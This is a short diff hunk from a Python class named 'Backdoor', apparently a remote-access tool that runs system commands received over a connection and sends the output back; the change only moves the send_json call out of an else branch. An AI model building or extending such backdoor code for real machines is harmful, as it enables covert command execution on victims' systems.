@@ -45,7 +45,8 @@ class Backdoor:
             else:
                 command_result = self.execute_sys_command(command)
                 # self.connection.send(command_result)
-                self.send_json(command_result)
+
+            self.send_json(command_result)
 
         self.connection.close()
 
